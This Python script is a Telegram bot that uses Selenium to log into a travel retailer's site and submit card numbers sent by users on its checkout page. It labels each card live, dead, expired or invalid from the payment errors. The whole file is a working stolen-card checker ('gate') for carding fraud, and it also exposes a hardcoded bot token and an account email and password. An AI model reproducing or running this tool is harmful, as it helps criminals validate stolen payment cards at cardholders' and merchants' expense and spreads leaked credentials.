import telebot
import requests
import time
import os
import re
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

import time

bot = telebot.TeleBot("1909365203:AAG8KtuhUcZp_QUEOovitQ-q5fdL13OAPh8", parse_mode='HTML')
#tor_proxy = "127.0.0.1:9150"
options = webdriver.ChromeOptions()
options.add_argument("window-size=1200x1000")
options.add_argument("--log-level=3")
options.add_argument("--disable-extensions");
options.add_argument("test-type");
#options.add_argument('headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument("--disable-single-click-autofill");
options.add_argument("--disable-autofill-keyboard-accessory-view[8]");
options.add_experimental_option('excludeSwitches', ['enable-logging'])

#options.add_argument('--ignore-certificate-errors')
#options.add_argument('disable-infobars')
#options.add_argument("--incognito")
#options.add_argument('--user-data=C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default')
#options.add_argument('--proxy-server=socks5://%s' % tor_proxy)

@bot.message_handler(commands=['chk'])
def send_welcome(message):
	bot.reply_to(message,'Checkeando...')
	driver = webdriver.Chrome(executable_path=r'C:\Program Files (x86)\chromedriver.exe' , options=options)


	driver.get("https://www.awaytravel.com/login")
	time.sleep(1)
	###
	### Bulling data ###
	###
	driver.find_element_by_id('content').click()
	
	driver.find_element_by_id('login-email').send_keys("pardoshirt@gmail.com")
	driver.find_element_by_id('login-password').send_keys("colombia20")
	driver.find_element_by_xpath('//*[@id="content"]/div/div/form/div[4]/button').click()
	time.sleep(3)
	x = ''
	cccap = re.findall(r'\d+', message.text)
	for ccadd in cccap:
		x=x+str(ccadd)
	ccn = x[0:16]
	mescc = x[16:18]
	anocc = x[20:22]
	cvv=x[22:25]

	driver.get('https://www.awaytravel.com/checkout/payment')
	iframes = driver.find_elements_by_xpath("//iframe[@title='Secure card number input frame']")
	driver.switch_to.frame(iframes[0])
	driver.find_element_by_name('cardnumber').send_keys(ccn)
	driver.switch_to.default_content()
	iframes = driver.find_elements_by_xpath("//iframe[@title='Secure CVC input frame']")
	driver.switch_to.frame(iframes[0])
	driver.find_element_by_name('cvc').send_keys(cvv)
	driver.switch_to.default_content()
	iframes = driver.find_elements_by_xpath("//iframe[@title='Secure expiration date input frame']")
	driver.switch_to.frame(iframes[0])
	driver.find_element_by_name('exp-date').send_keys(mescc+' / '+anocc)
	driver.switch_to.default_content()
	driver.find_element_by_id('checkout-payment-submit').click()
	time.sleep(1)
	ward = True
	while ward == True:
		valid = driver.find_element_by_id('content').text
		try:
			confirm = driver.find_element_by_id('checkout_form_confirm').get_attribute('action')
			if '/checkout/update/confirm' in confirm:
				bot.reply_to(message,'╚ASSOCIATED╝ - '+ccn+' | '+mescc+' | '+anocc+' | '+cvv+'  - †Coder: Raulshp† - •Gate: EscanorGay• ')
				ward = False
				driver.quit()
		except:
			if 'security code is incorrect' in valid:
				bot.reply_to(message,'╚Live╝ - '+ccn+' | '+mescc+' | '+anocc+' | '+cvv+'  - †Coder: Raulshp† - •Gate: EscanorGay• ')
				ward = False
				driver.quit()
			elif 'Your card was declined' in valid:
				bot.reply_to(message,'╚Die╝ - '+ccn+' | '+mescc+' | '+anocc+' | '+cvv+'  - †Coder: Raulshp† - •Gate: EscanorGay• ')
				ward = False
				driver.quit()
			elif 'Your card has expired.' in valid:
				bot.reply_to(message,'╚Expired╝ - '+ccn+' | '+mescc+' | '+anocc+' | '+cvv+'  - †Coder: Raulshp† - •Gate: EscanorGay• ')
				ward = False
				driver.quit()
			elif 'Your card number is incorrect' in valid:
				bot.reply_to(message,'╚Invalid╝ - '+ccn+' | '+mescc+' | '+anocc+' | '+cvv+'  - †Coder: Raulshp† - •Gate: EscanorGay• ')
				ward = False
				driver.quit()
			elif 'Your card does not support this type of purchase.' in valid:
				bot.reply_to(message,'╚Not Allowed╝ - '+ccn+' | '+mescc+' | '+anocc+' | '+cvv+'  - †Coder: Raulshp† - •Gate: EscanorGay• ')
				ward = False
				driver.quit()
		pass
try:
  bot.polling()

except:
  bot.polling()